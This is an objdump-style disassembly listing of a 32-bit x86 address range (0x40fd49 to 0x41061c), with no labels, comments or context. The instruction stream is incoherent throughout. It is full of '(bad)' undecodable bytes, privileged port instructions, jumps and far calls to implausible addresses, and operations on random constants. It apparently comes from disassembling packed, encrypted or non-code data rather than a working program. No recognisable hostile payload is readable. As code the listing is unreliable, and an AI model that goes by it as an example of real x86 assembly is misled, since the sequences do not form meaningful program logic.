  40fd49:	shr    al,1
  40fd4b:	sahf   
  40fd4c:	cmp    bh,bh
  40fd4e:	inc    esp
  40fd50:	mov    edi,0x1c0a0cc0
  40fd55:	mov    ebp,esp
  40fd57:	mov    DWORD PTR [esi+eax*8+0x8d],ecx
	...
  40fd6a:	aas    
  40fd6b:	mov    ch,0x4e
  40fd6d:	push   0x414303
  40fd72:	arpl   WORD PTR [eax+0x9],cx
  40fd75:	push   0x63
  40fd77:	inc    esi
  40fd78:	fld    QWORD PTR [eax-0x5e]
  40fd7b:	(bad)  
  40fd7d:	mov    ebp,0x8502de9b
  40fd82:	mov    ds:0x63bf7ae3,eax
  40fd87:	fiadd  WORD PTR [edx]
  40fd89:	mov    esi,DWORD PTR [esi]
  40fd8b:	mov    ds:0x21d6117e,al
  40fd90:	int3   
  40fd91:	dec    edi
  40fd92:	mov    esp,0x11fecfe9
  40fd97:	fiadd  DWORD PTR [edi+0x72565cbf]
  40fd9d:	jmp    DWORD PTR [esi+ebx*8-0x2164837b]
  40fda4:	add    DWORD PTR [edi+ebp*8-0x5bfffd22],eax
  40fdab:	cdq    
  40fdac:	mov    dh,0xff
  40fdae:	test   dh,bl
  40fdb0:	add    al,bh
  40fdb2:	es push ss
  40fdb4:	add    al,0x0
  40fdb6:	arpl   si,bx
  40fdb8:	leave  
  40fdb9:	inc    esp
  40fdba:	xchg   ebx,eax
  40fdbb:	test   BYTE PTR [ebx],0x0
  40fdbe:	arpl   WORD PTR [ebx],sp
  40fdc0:	dec    ecx
  40fdc1:	int3   
  40fdc2:	arpl   si,bx
  40fdc4:	add    al,BYTE PTR [eax]
  40fdc6:	call   0x71cbc83b
  40fdcb:	push   ecx
  40fdcc:	dec    ecx
  40fdcd:	int3   
	...
  40fdda:	add    BYTE PTR [eax],al
  40fddc:	add    BYTE PTR [ebx-0x6c2fb6a7],dh
  40fde2:	mov    BYTE PTR [ebx],al
  40fde4:	jmp    FWORD PTR [esi+0x5f51d2f6]
  40fdea:	xlat   BYTE PTR ds:[ebx]
  40fdeb:	ret    0x8f74
  40fdee:	pop    edi
  40fdef:	push   ecx
  40fdf0:	int3   
  40fdf1:	bound  ecx,QWORD PTR [ecx+0x41]
  40fdf4:	adc    DWORD PTR [esi-0x5a8bfc0e],0x5
  40fdfb:	push   ecx
  40fdfc:	in     eax,dx
  40fdfd:	mov    ds:0x77d2e946,al
  40fe02:	mov    cl,0xc0
  40fe04:	enter  0x59c,0xe9
  40fe08:	(bad)  
  40fe09:	lods   al,BYTE PTR ds:[esi]
  40fe0a:	push   eax
  40fe0b:	repz imul ebx,DWORD PTR [eax*1+0x41ea03e9],0xc45ddea1
  40fe17:	and    edi,DWORD PTR [esp+ecx*8-0x3bfc1735]
  40fe1e:	push   ecx
  40fe1f:	mov    cl,0xd2
  40fe21:	aaa    
  40fe22:	mov    cl,0x95
  40fe24:	pop    eax
  40fe25:	imul   ebx,ebp,0xffffff86
  40fe28:	shr    BYTE PTR [ebp-0x70a77a35],1
  40fe2e:	(bad)  
  40fe30:	cmp    esp,DWORD PTR [ebx+0x5]
  40fe33:	push   0x50
  40fe35:	mov    ebx,0x8dfbf504
  40fe3a:	push   ecx
  40fe3b:	inc    ecx
  40fe3c:	fistp  DWORD PTR [ebp+edi*1-0x17]
  40fe40:	add    eax,DWORD PTR [eax]
	...
  40fe4e:	add    BYTE PTR [eax],al
  40fe50:	mov    BYTE PTR [eax+0x61],bh
  40fe53:	cmp    BYTE PTR [ebx+0x7f],bh
  40fe56:	cli    
  40fe57:	shl    bh,cl
  40fe59:	int3   
  40fe5a:	inc    ebp
  40fe5b:	xor    eax,0xcf93805b
  40fe60:	jmp    0x5799345c
  40fe65:	retf   
  40fe66:	call   0xae03:0xecc81bfb
  40fe6d:	jle    0x40fe7b
  40fe6f:	xchg   BYTE PTR [eax],ah
  40fe71:	out    0xbe,al
  40fe73:	xchg   BYTE PTR [edi+0x28],dh
  40fe76:	stos   DWORD PTR es:[edi],eax
  40fe77:	inc    esp
  40fe78:	arpl   WORD PTR ds:0x11df17c,ax
  40fe7e:	pushf  
  40fe7f:	inc    ebp
  40fe80:	mov    ds:0x60e80005,al
  40fe85:	add    eax,0x47872f00
  40fe8a:	inc    ecx
  40fe8b:	jmp    0xa8a702b7
  40fe90:	dec    ecx
  40fe91:	pop    es
  40fe92:	sub    DWORD PTR [edi+0xf83635d],0x67
  40fe99:	push   eax
  40fe9a:	repz push 0x54
  40fe9d:	ins    BYTE PTR es:[edi],dx
  40fe9e:	sub    eax,0xf056728
  40fea3:	ins    DWORD PTR es:[edi],dx
  40fea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fea5:	retf   0xe9fe
  40fea8:	out    0x9,eax
  40feaa:	xchg   ebp,eax
  40feab:	xlat   BYTE PTR ds:[ebx]
  40feac:	and    DWORD PTR ds:0xd8e4ee00,eax
  40feb2:	(bad)  
  40feb3:	call   0x40feb8
	...
  40fec0:	add    BYTE PTR [eax],al
  40fec2:	add    BYTE PTR [eax-0x7a],ah
  40fec5:	cmp    al,0xe0
  40fec7:	dec    ecx
  40fec8:	inc    esp
  40fec9:	add    cl,ch
  40fecb:	arpl   WORD PTR [ecx+0x560e9e0],ax
  40fed1:	(bad)  
  40fed2:	sub    al,0xb3
  40fed4:	retf   0xe9fe
  40fed7:	pusha  
  40fed8:	ret    0x6144
  40fedb:	pop    edi
  40fedc:	add    eax,0x40fde900
  40fee1:	cld    
  40fee2:	mov    ecx,0xb9f840f5
  40fee7:	push   cs
  40fee8:	add    eax,0x441d9268
  40feed:	add    BYTE PTR [esi],bh
  40feef:	push   esp
  40fef0:	jno    0x40ff1f
  40fef2:	test   al,0x60
  40fef4:	(bad)  
  40fef5:	mov    edi,0xff8fe4de
  40fefa:	call   0x21bd855f
  40feff:	addr16 cli 
  40ff01:	add    DWORD PTR [ebp+0x5f],0x5
  40ff05:	add    BYTE PTR [edx-0x64],ch
  40ff08:	leave  
  40ff09:	(bad)  
  40ff0a:	jmp    FWORD PTR ds:0xa00a082
  40ff10:	push   es
  40ff11:	mov    esi,DWORD PTR [ebp+0xe]
  40ff14:	scas   eax,DWORD PTR es:[edi]
  40ff15:	add    BYTE PTR [eax],0xfa
  40ff18:	add    eax,0xb4648b56
  40ff1d:	je     0x40ff37
  40ff1f:	lea    eax,[ebx-0x10]
  40ff22:	call   DWORD PTR [ebp+edx*8+0x458d]
	...
  40ff35:	add    BYTE PTR [esi],dl
  40ff37:	cs popa 
  40ff39:	inc    edx
  40ff3a:	cmp    eax,DWORD PTR [ecx]
  40ff3c:	call   0x428418
  40ff41:	shr    DWORD PTR [edx+0x4302be80],1
  40ff47:	inc    ebx
  40ff48:	loopne 0x40ffb2
  40ff4a:	pop    ebx
  40ff4b:	inc    ebx
  40ff4c:	inc    ecx
  40ff4d:	add    BYTE PTR [ebp+0x43],cl
  40ff50:	in     al,0xc7
  40ff52:	xchg   ebp,esp
  40ff54:	(bad)  
  40ff55:	(bad)  
  40ff56:	mov    edx,0xd2458d05
  40ff5b:	adc    eax,0x170016a
  40ff60:	push   0x0
  40ff62:	inc    DWORD PTR [edx-0x20]
  40ff65:	push   eax
  40ff66:	pusha  
  40ff67:	add    DWORD PTR [ebp-0xe9d5bb],ecx
  40ff6d:	adc    eax,0x40ee73
  40ff72:	add    ebp,0x3af92d72
  40ff78:	in     al,dx
  40ff79:	add    BYTE PTR [esi+0x4a01b81c],ah
  40ff7f:	add    eax,0x308a0b00
  40ff84:	push   ss
  40ff85:	call   DWORD PTR [edi]
  40ff87:	int    0xfd
  40ff89:	jne    0x40fffd
  40ff8b:	mov    ch,0x73
  40ff8d:	in     al,dx
  40ff8e:	pop    ebp
  40ff8f:	or     BYTE PTR cs:[eax+0x63],ch
  40ff93:	fiadd  DWORD PTR [edx]
  40ff95:	out    dx,eax
  40ff96:	in     eax,dx
  40ff97:	push   es
  40ff98:	sti    
  40ff99:	clc    
	...
  40ffa6:	add    BYTE PTR [eax],al
  40ffa8:	add    BYTE PTR [eax+eax*1],ah
  40ffab:	shl    BYTE PTR [edi+ecx*1-0x9],1
  40ffaf:	xchg   ebp,eax
  40ffb0:	inc    esp
  40ffb1:	arpl   si,bx
  40ffb3:	xor    bh,bh
  40ffb5:	sahf   
  40ffb6:	(bad)  
  40ffb7:	add    ch,0x5f
  40ffba:	pop    ebx
  40ffbb:	push   ecx
  40ffbc:	clc    
  40ffbd:	arpl   WORD PTR [edx],si
  40ffbf:	std    
  40ffc0:	xor    BYTE PTR ds:0x7c84fdde,0xb7
  40ffc7:	into   
  40ffc8:	(bad)  
  40ffc9:	in     al,0x9
  40ffcb:	sar    dh,1
  40ffcd:	jbe    0x410034
  40ffcf:	push   ds
  40ffd0:	inc    ecx
  40ffd1:	arpl   ax,si
  40ffd3:	mov    esp,0x37de67c1
  40ffd8:	mov    esi,DWORD PTR [edi+0x49f7c85b]
  40ffde:	ficomp WORD PTR [eax+0x2f]
  40ffe1:	mov    ah,0xe9
  40ffe3:	sti    
  40ffe4:	out    0x2,eax
  40ffe6:	out    dx,al
  40ffe7:	into   
  40ffe8:	(bad)  
  40ffe9:	ficomp DWORD PTR [ecx]
  40ffeb:	sar    BYTE PTR [edi+0x5e],1
  40ffee:	jle    0x410034
  40fff0:	inc    ecx
  40fff1:	arpl   si,bx
  40fff3:	push   edi
  40fff4:	sub    ebx,edi
  40fff6:	add    BYTE PTR [ecx+eax*2+0x63],0xb6
  40fffb:	ins    BYTE PTR es:[edi],dx
  40fffc:	inc    eax
  40fffd:	and    bl,dh
  40ffff:	(bad)  
  410001:	cmc    
  410002:	cs iret 
  410004:	test   BYTE PTR [ebx-0x7d97d44e],ah
  41000a:	popf   
  41000b:	inc    ebx
	...
  41001c:	retf   
  41001d:	push   ds
  41001e:	inc    ebp
  41001f:	inc    ecx
  410020:	arpl   WORD PTR [esi-0x4e],ax
  410023:	jge    0x410071
  410025:	pop    ss
  410026:	mov    BYTE PTR [ebx+eax*2],0x5
  41002a:	test   al,0x44
  41002c:	arpl   WORD PTR [esi],ax
  41002e:	push   0x11
  410030:	ds inc esi
  410032:	test   al,0x3
  410034:	arpl   WORD PTR [ecx-0x2d],dx
  410037:	(bad)  
  410038:	lahf   
  410039:	int    0xe8
  41003b:	add    esp,DWORD PTR [ebx+0x5]
  41003e:	rol    bl,cl
  410040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410041:	xor    eax,0xcdb78099
  410046:	call   0x6345:0x27e26fce
  41004d:	sub    BYTE PTR [eax-0x9239eb4],0x82
  410054:	outs   dx,DWORD PTR ds:[esi]
  410055:	int    0xe8
  410057:	pop    eax
  410058:	popa   
  410059:	(bad)  
  41005b:	into   
  41005c:	push   edi
  41005d:	int    0xbd
  41005f:	pop    eax
  410060:	imul   ebx,ebp,0x3a
  410063:	retf   
  410064:	int    0xc7
  410066:	popa   
  410067:	cmp    bl,cl
  410069:	jnp    0x410065
  41006b:	into   
  41006c:	aaa    
  41006d:	int    0x9d
  41006f:	xor    DWORD PTR [ebx-0x38],ebp
  410072:	sbb    edi,esp
  410074:	les    edi,FWORD PTR [edx]
  410076:	mov    esi,cs
  410078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410079:	(bad)  
  41007a:	sti    
  41007b:	sti    
  41007c:	test   BYTE PTR [ebx],bl
  41007e:	jg     0x41004e
	...
  41008c:	add    BYTE PTR [eax],al
  41008e:	add    BYTE PTR [ebp-0x72300439],dl
  410094:	push   ecx
  410095:	loope  0x410072
  410097:	xor    BYTE PTR [esi+0x66],dl
  41009a:	into   
  41009b:	stos   DWORD PTR es:[edi],eax
  41009c:	ret    0x3e4
  41009f:	push   cs
  4100a0:	jl     0x4100e6
  4100a2:	and    BYTE PTR [eax+0x1036b6d4],0x7c
  4100a9:	fwait
  4100aa:	jmp    DWORD PTR ds:0x6303e904
  4100b0:	add    eax,0xfdab3600
  4100b5:	out    0x6d,eax
  4100b7:	pushf  
  4100b8:	add    eax,0x6286a00
  4100bd:	ja     0x4100af
  4100bf:	pop    ecx
  4100c0:	lds    ebx,FWORD PTR [edx-0x4a]
  4100c3:	jle    0x410081
  4100c5:	shl    ecx,0x60
  4100c8:	mov    ah,0xe7
  4100ca:	jb     0x410127
  4100cc:	stc    
  4100cd:	mov    bl,ch
  4100cf:	cdq    
  4100d0:	scas   al,BYTE PTR es:[edi]
  4100d1:	push   cs
  4100d2:	imul   edi,DWORD PTR [edx-0x7616013a],0x51
  4100d9:	or     BYTE PTR [edx-0x54],dh
  4100dc:	std    
  4100dd:	jmp    0x1369:0x57a7d43
  4100e4:	pop    ss
  4100e5:	jb     0x4100ca
  4100e7:	loopne 0x4100b3
  4100e9:	cmp    BYTE PTR [esi],bh
  4100eb:	fs test ebx,ebp
  4100ee:	stc    
  4100ef:	mov    ebx,0xb57feb
	...
  410100:	add    BYTE PTR [eax],al
  410102:	and    BYTE PTR [ebx+0xd],dl
  410105:	imul   esi,DWORD PTR [ebx-0x1f0e88c0],0xab6940da
  41010f:	cld    
  410110:	jmp    0x752e:0x5ac54be0
  410117:	mov    esp,0x960f1c1
  41011c:	xor    bl,bh
  41011e:	cwde   
  41011f:	or     bh,BYTE PTR [ecx]
  410121:	(bad)  
  410122:	sbb    DWORD PTR fs:[eax],esi
  410125:	or     BYTE PTR [esi+0x7adb410a],0xa
  41012c:	inc    esi
  41012d:	(bad)  
  41012e:	pop    esi
  41012f:	sbb    DWORD PTR [ecx-0x13],eax
  410132:	push   0xffffffdb
  410134:	or     BYTE PTR [edx],al
  410136:	lahf   
  410137:	sub    ebx,DWORD PTR [edi+0x0]
  41013a:	add    al,0x8b
  41013c:	ror    BYTE PTR [eax],0x4a
  41013f:	ret    0x4de
  410142:	inc    eax
  410143:	mov    esi,0xbfb94ba8
  410148:	add    BYTE PTR [ebx],cl
  41014a:	mov    eax,ds:0xff8ba22e
  41014f:	(bad)  
  410152:	lds    edi,FWORD PTR [esi]
  410154:	clc    
  410155:	dec    edi
  410157:	leave  
  410158:	lea    eax,[ebp+0x66]
  41015b:	rol    BYTE PTR [ebx-0xc],0xa
  41015f:	add    al,BYTE PTR [eax]
  410161:	add    BYTE PTR [ecx-0xa],bh
  410164:	or     BYTE PTR [ecx],ch
	...
  410172:	add    BYTE PTR [eax],al
  410174:	add    BYTE PTR [ebx+0x3c740001],bh
  41017a:	inc    esi
  41017b:	inc    esp
  41017c:	lock cmp ch,BYTE PTR [ebx]
  41017f:	add    DWORD PTR [edx-0x6],ebp
  410182:	sub    eax,DWORD PTR [eax]
  410184:	push   0xfffffffa
  410186:	sub    eax,DWORD PTR [eax]
  410188:	lea    ecx,[edi-0x5000b147]
  41018e:	retf   0x4127
  410191:	mov    edx,0xd074becc
  410196:	test   BYTE PTR [ebx-0xc],bh
  410199:	retf   0x342d
  41019c:	mov    edi,DWORD PTR [edi+0x5]
  41019f:	mov    ecx,DWORD PTR [ebp-0x36]
  4101a2:	cld    
  4101a3:	pop    es
  4101a4:	ja     0x410146
  4101a6:	mov    ch,0x89
  4101a8:	jne    0x4101c8
  4101aa:	dec    ebp
  4101ab:	jl     0x4101b5
  4101ad:	adc    DWORD PTR [edi],eax
  4101af:	lock jecxz 0x41022a
  4101b2:	mov    ah,0xa2
  4101b4:	mov    edi,DWORD PTR [edi]
  4101b6:	add    eax,0x491a75ff
  4101bb:	(bad)  
  4101bc:	dec    BYTE PTR [edi+0x63e3e6ad]
  4101c2:	fwait
  4101c3:	add    al,BYTE PTR [eax]
  4101c5:	stos   DWORD PTR es:[edi],eax
  4101c6:	fadd   QWORD PTR [edx]
  4101c8:	add    BYTE PTR [ebx+0x67],ah
  4101cb:	sub    ebx,DWORD PTR [esi+0x2a]
  4101ce:	icebp  
  4101cf:	cli    
  4101d0:	(bad)  
  4101d1:	jns    0x4101c1
  4101d3:	daa    
  4101d4:	pop    edi
  4101d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101d6:	in     eax,0xc0
  4101d8:	pop    es
	...
  4101e5:	add    BYTE PTR [eax],al
  4101e7:	add    BYTE PTR [ebx-0x7f],ah
  4101ea:	ja     0x4101d7
  4101ec:	loopne 0x4101d8
  4101ee:	ret    0x6367
  4101f1:	into   
  4101f2:	add    al,BYTE PTR [eax]
  4101f4:	cmp    edx,DWORD PTR [ecx+edx*2-0x1]
  4101f8:	sbb    al,0x36
  4101fa:	inc    esi
  4101fb:	cld    
  4101fc:	mov    ebp,DWORD PTR [esi+0x6630022]
  410202:	xchg   ecx,eax
  410203:	jno    0x410209
  410205:	mov    ah,0x78
  410207:	inc    esp
  410208:	sti    
  410209:	push   esi
  41020a:	add    al,0x20
  41020c:	arpl   WORD PTR [esi-0x248e5b26],bp
  410212:	retf   0x9e88
  410215:	ficomp DWORD PTR [ebx+0x0]
  410218:	sub    DWORD PTR [esi+0xfbe802],0xffffffcb
  41021f:	(bad)  
  410220:	(bad)  
  410222:	shl    DWORD PTR [edi+0x63],cl
  410225:	push   cs
  410226:	add    al,0x0
  410228:	retf   
  410229:	aaa    
  41022a:	push   esi
  41022b:	push   DWORD PTR [ebp+esi*1-0x51c413bf]
  410232:	and    al,BYTE PTR [eax]
  410234:	arpl   WORD PTR [esi-0x74638db7],ax
  41023a:	jl     0x410280
  41023c:	mov    edx,DWORD PTR [esi]
  41023e:	add    al,0x20
  410240:	arpl   WORD PTR [esi+0x331170da],bp
  410246:	retf   
  410247:	mov    BYTE PTR [esi],ah
  410249:	add    eax,0xcb4d
	...
  41025a:	add    bh,ch
  41025c:	adc    al,0xd1
  41025e:	(bad)  [edx]
  410260:	inc    esi
  410261:	jmp    0x4101f230
  410266:	jnp    0x410208
  410268:	add    eax,0x112086e9
  41026d:	ds push ecx
  41026f:	jae    0x41029e
  410271:	xor    al,BYTE PTR [esi-0x5e]
  410274:	add    eax,0xad3b512e
  410279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41027a:	aas    
  41027b:	arpl   WORD PTR ds:0xc458c06a,ax
  410281:	fwait
  410282:	repz mov esp,0x6344aa15
  410288:	les    edi,FWORD PTR [ebx-0x31]
  41028b:	cld    
  41028c:	sub    eax,0x886303a5
  410291:	sub    al,0xf8
  410293:	add    eax,0x4c5bd93a
  410298:	dec    eax
  410299:	sub    BYTE PTR [esp+esi*8],al
  41029c:	cmp    ecx,ebx
  41029e:	fist   DWORD PTR [esi-0x1ffc16b7]
  4102a4:	enter  0xcadc,0x57
  4102a8:	adc    eax,0x46204651
  4102ad:	jmp    0xc0f25a7c
  4102b2:	inc    esi
  4102b3:	pop    ds
  4102b4:	add    eax,0x10a086e9
  4102b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102ba:	push   eax
  4102bb:	addr16 sub eax,0x4741
	...
  4102cd:	add    BYTE PTR [edx],ah
  4102cf:	add    eax,0xacbb5096
  4102d4:	fdivr  DWORD PTR [edi]
  4102d6:	arpl   WORD PTR ds:0xc468bf6a,ax
  4102dc:	repz repz add al,0x29
  4102e0:	add    BYTE PTR [edx],ch
  4102e2:	push   ds
  4102e3:	add    eax,0xab9cf4ff
  4102e8:	sbb    al,0xad
  4102ea:	pusha  
  4102eb:	add    eax,0x2d742583
  4102f0:	add    BYTE PTR [esi+0x13],dl
  4102f3:	sar    esi,0xd4
  4102f6:	push   esp
  4102f7:	les    esi,FWORD PTR [esi+ecx*1]
  4102fa:	jbe    0x410340
  4102fc:	add    BYTE PTR [ecx+0x11],dl
  4102ff:	aaa    
  410300:	push   DWORD PTR [esi]
  410302:	(bad)  
  410303:	dec    ecx
  410304:	loopne 0x4102c9
  410306:	pusha  
  410307:	ret    0x2174
  41030a:	sub    DWORD PTR [edx],edi
  41030c:	or     al,0x1e
  41030e:	push   ebx
  41030f:	jmp    0x95c0:0xad60a828
  410316:	sub    esp,eax
  410318:	mov    BYTE PTR [esp+edi*4-0x6301ffd4],ch
  41031f:	mov    ecx,0xc40c7cfe
  410324:	xor    al,0xc6
  410326:	pop    edi
  410327:	inc    esp
  410328:	add    cl,dl
  41032a:	(bad)  
  41032b:	ss (bad) 
  41032d:	fisubr WORD PTR [eax+0x49]
  410330:	fadd   DWORD PTR [ebx+0x0]
	...
  41033f:	add    BYTE PTR [eax],al
  410341:	pop    edi
  410342:	ret    0xd974
  410345:	stos   BYTE PTR es:[edi],al
  410346:	cmp    eax,ebp
  410348:	(bad)  
  410349:	fs jmp 0x3d94:0xad672828
  410351:	call   0x2c:0xf32488c3
  410358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410359:	and    al,0xb1
  41035b:	(bad)  
  41035c:	adc    al,0x8f
  41035e:	ret    
  41035f:	xor    al,0xce
  410361:	dec    ecx
  410362:	inc    esp
  410363:	add    BYTE PTR [ecx+0xff392a],al
  410369:	fnstsw WORD PTR [esi]
  41036b:	inc    esp
  41036c:	sar    bh,1
  41036e:	add    eax,eax
  410370:	push   eax
  410371:	or     eax,0x77ffe452
  410376:	mov    edx,0x1e6535fd
  41037b:	inc    ecx
  41037c:	add    BYTE PTR [edx],dl
  41037e:	and    al,0x74
  410380:	dec    DWORD PTR ds:0xc9cc443e
  410386:	dec    edx
  410387:	loopne 0x410389
  410389:	dec    ebp
  41038a:	inc    edx
  41038b:	mov    dh,0x0
  41038d:	cmp    al,BYTE PTR [esi]
  41038f:	cmp    DWORD PTR [ebp+0x66],0x9
  410393:	je     0x410d58
  410399:	leave  
  41039a:	dec    edx
  41039b:	rol    BYTE PTR [eax],1
  41039d:	cmp    eax,0x3a00a242
  4103a2:	push   es
  4103a3:	lea    eax,[ebp+0x0]
	...
  4103b2:	add    BYTE PTR [eax],al
  4103b4:	inc    esi
  4103b5:	stc    
  4103b6:	(bad)  
  4103b7:	jne    0x41042f
  4103b9:	loope  0x410409
  4103bb:	std    
  4103bc:	or     eax,0xfdc009cd
  4103c1:	inc    ecx
  4103c2:	mov    es,WORD PTR [eax]
  4103c4:	or     al,BYTE PTR [esi]
  4103c6:	cmp    DWORD PTR [ebp-0x3a],0x5
  4103ca:	je     0x410a57
  4103d0:	jg     0x4103d5
  4103d2:	enter  0xad50,0x52
  4103d6:	shr    al,1
  4103d8:	fmul   st,st(2)
  4103da:	std    
  4103db:	call   ecx
  4103dd:	lds    esi,FWORD PTR [edx+0x75]
  4103e0:	cmp    DWORD PTR [ebx-0x38],ecx
  4103e3:	add    BYTE PTR [esi+0x5c],dh
  4103e6:	push   0xbcdcca10
  4103eb:	call   DWORD PTR [edi-0x3f]
  4103ee:	out    0x76,al
  4103f0:	arpl   WORD PTR [ecx],cx
  4103f2:	leave  
  4103f3:	(bad)  
  4103f4:	pushf  
  4103f5:	sbb    ah,ah
  4103f7:	dec    BYTE PTR [esi]
  4103f9:	mov    ah,0xda
  4103fb:	int3   
  4103fc:	inc    BYTE PTR [edx-0x38]
  4103ff:	dec    BYTE PTR [esi]
  410401:	cwde   
  410402:	(bad)  
  410403:	je     0x410470
  410405:	test   ah,al
  410407:	ins    BYTE PTR es:[edi],dx
  410408:	je     0x410434
  41040a:	enter  0x8b74,0x62
  41040e:	dec    esi
  41040f:	or     BYTE PTR [ebx-0x5e],bh
  410412:	push   ebp
  410413:	call   FWORD PTR [eax+edx*2+0x4e]
  410417:	les    eax,FWORD PTR [eax]
	...
  410425:	add    BYTE PTR [eax],al
  410427:	push   esp
  410428:	sub    BYTE PTR [esi-0x25492902],0x7c
  41042f:	mov    dh,0xf7
  410431:	(bad)  
  410432:	(bad)  
  410433:	mov    dh,0xe6
  410435:	(bad)  
  410436:	je     0x41044b
  410438:	call   0x907c0c8a
  41043d:	push   ebp
  41043e:	jmp    DWORD PTR [esp+ebp*1]
  410441:	inc    esi
  410442:	int3   
  410443:	arpl   WORD PTR [edx-0x11697d13],bx
  410449:	(bad)  
  41044a:	je     0x4104a8
  41044c:	xor    edi,DWORD PTR [esi]
  41044e:	int3   
  41044f:	add    al,0x7f
  410451:	(bad)  
  410452:	je     0x4104bf
  410454:	push   es
  410455:	and    ebp,DWORD PTR [ebp-0xc]
  410458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410459:	fimul  DWORD PTR [ecx]
  41045b:	jns    0x41040b
  41045d:	lds    esi,FWORD PTR [ebx+ebx*2-0x3a]
  410461:	out    dx,eax
  410462:	ins    BYTE PTR es:[edi],dx
  410463:	fmul   st(7),st
  410465:	(bad)  
  410466:	je     0x41043f
  410468:	(bad)  
  410469:	sub    BYTE PTR [edi-0x34],0x7f
  41046d:	(bad)  
  41046e:	je     0x41043b
  410470:	(bad)  
  410471:	dec    edx
  410472:	jo     0x410430
  410474:	outs   dx,DWORD PTR ds:[esi]
  410475:	(bad)  
  410476:	je     0x410427
  410478:	add    eax,0xc0335391
  41047d:	popf   
  41047e:	(bad)  
  41047f:	das    
  410480:	mov    ch,0x80
  410482:	pop    ebx
  410483:	adc    eax,eax
  410485:	(bad)  
  410486:	(bad)  
  410487:	cmpxchg DWORD PTR [eax+0x63],edx
	...
  41049a:	adc    eax,eax
  41049c:	jge    0x410465
  41049e:	shrd   DWORD PTR [eax+0x6dbff32b],eax,cl
  4104a5:	(bad)  
  4104a6:	out    dx,eax
  4104a7:	test   al,0x50
  4104a9:	xor    esi,ebx
  4104ab:	mov    edi,0xa4efc75d
  4104b0:	inc    eax
  4104b1:	cmp    edx,ebx
  4104b3:	ror    BYTE PTR [ebp-0x39],0xcf
  4104b7:	loope  0x410509
  4104b9:	inc    ebx
  4104ba:	rol    eax,cl
  4104bc:	cmp    eax,0x40ddcfc7
  4104c1:	or     esi,DWORD PTR [ebx-0x5038d240]
  4104c7:	fst    DWORD PTR [eax]
  4104c9:	adc    esi,DWORD PTR [ebx-0x5038e240]
  4104cf:	aad    0x0
  4104d1:	sbb    edx,DWORD PTR [ebx-0x7038f240]
  4104d7:	rcl    DWORD PTR [eax],1
  4104d9:	and    edx,DWORD PTR [ebx+0x22bcfdc0]
  4104df:	adc    ecx,ebp
  4104e1:	xor    al,ch
  4104e3:	mov    al,0x67
  4104e5:	sar    ah,0xb7
  4104e8:	in     eax,0xc6
  4104ea:	fisttp WORD PTR [ecx-0x23]
  4104ed:	xor    esp,esp
  4104ef:	cmp    ebp,esp
  4104f1:	(bad)  
  4104f2:	xchg   edi,eax
  4104f3:	call   0xada449f7
  4104f8:	dec    esp
  4104f9:	inc    edx
  4104fa:	arpl   WORD PTR ds:0xc3f2,ax
	...
  41050c:	add    BYTE PTR [ebp-0x76],dl
  41050f:	(bad)  
  410510:	fsub   QWORD PTR [edi+0x5]
  410513:	add    BYTE PTR [esi-0x170042dd],ah
  410519:	pusha  
  41051a:	add    eax,0xbe9324c7
  41051f:	push   es
  410520:	jmp    0x3413085
  410525:	pop    edi
  410526:	sub    eax,DWORD PTR [eax]
  410528:	adc    esp,DWORD PTR [edi-0x6e]
  41052b:	inc    esp
  41052c:	jne    0x41057e
  41052e:	xchg   edx,eax
  41052f:	test   BYTE PTR [ecx-0x53],bh
  410532:	mov    esi,0x389c19fe
  410537:	clc    
  410538:	adc    ax,cx
  41053b:	out    0x17,eax
  41053d:	and    DWORD PTR ds:0x3320e200,eax
  410543:	add    eax,0xfebf0540
  410548:	jmp    0xa868a2f5
  41054d:	pusha  
  41054e:	mov    esi,0x5e18e574
  410553:	jae    0x410583
  410555:	sbb    eax,0xab398b4f
  41055a:	mov    edi,ebp
  41055c:	push   ss
  41055d:	sbb    eax,0x38bb4fc0
  410562:	dec    esi
  410563:	jae    0x410573
  410565:	sbb    eax,0x1d11848e
  41056a:	sar    dh,0x11
  41056d:	jge    0x41059e
  41056f:	push   esi
	...
  41057d:	add    BYTE PTR [eax],al
  41057f:	add    BYTE PTR [ecx+ecx*2-0x10],dh
  410583:	cdq    
  410584:	cwde   
  410585:	loope  0x4105c8
  410587:	sub    BYTE PTR [edi-0x42],ah
  41058a:	mov    ah,0xd1
  41058c:	push   ss
  41058d:	sar    dh,0xd6
  410590:	ins    BYTE PTR es:[edi],dx
  410591:	out    0x28,al
  410593:	sub    BYTE PTR [edi-0x53],bl
  410596:	pushf  
  410597:	add    BYTE PTR [eax+0x3f89fdc8],cl
  41059d:	(bad)  
  41059f:	push   ebp
  4105a1:	test   BYTE PTR [ebx-0x2371214],bh
  4105a7:	add    BYTE PTR [esi-0x15],cl
  4105aa:	cmp    BYTE PTR [ebp-0x36],0x5
  4105ae:	jne    0x4105f9
  4105b0:	add    DWORD PTR [esi],edi
  4105b2:	jmp    0x4105ab
  4105b4:	in     eax,0xc8
  4105b6:	std    
  4105b7:	xor    BYTE PTR ds:0x5f7eb3e,dl
  4105bd:	enter  0xbd7f,0xe6
  4105c1:	sar    ch,1
  4105c3:	jmp    edx
  4105c5:	add    al,0x0
  4105c7:	add    BYTE PTR [esp+edi*4-0x2fe97a3b],cl
  4105ce:	std    
  4105cf:	jmp    DWORD PTR [edx-0x5efffffc]
  4105d5:	stos   DWORD PTR es:[edi],eax
  4105d6:	std    
  4105d7:	lea    esi,[esi-0x7a000230]
  4105dd:	mov    gs,edx
  4105df:	div    DWORD PTR [ebp-0x38]
  4105e2:	std    
  4105e3:	mov    ch,0x0
	...
  4105f1:	add    BYTE PTR [eax],al
  4105f3:	mov    ds:0x85fffdd0,al
  4105f8:	dec    esi
  4105f9:	or     al,ch
  4105fb:	add    al,dh
  4105fd:	std    
  4105fe:	dec    DWORD PTR [ecx+0x65f7ea86]
  410604:	enter  0x74fe,0x47
  410608:	enter  0xecb3,0xd
  41060c:	leave  
  41060d:	std    
  41060e:	call   0x405f29
  410613:	add    eax,0x5f7ea8f
  410618:	leave  
  410619:	out    0x11,al
  41061b:	xchg   ebp,eax
  41061c:	enter  0xfffd,0x63
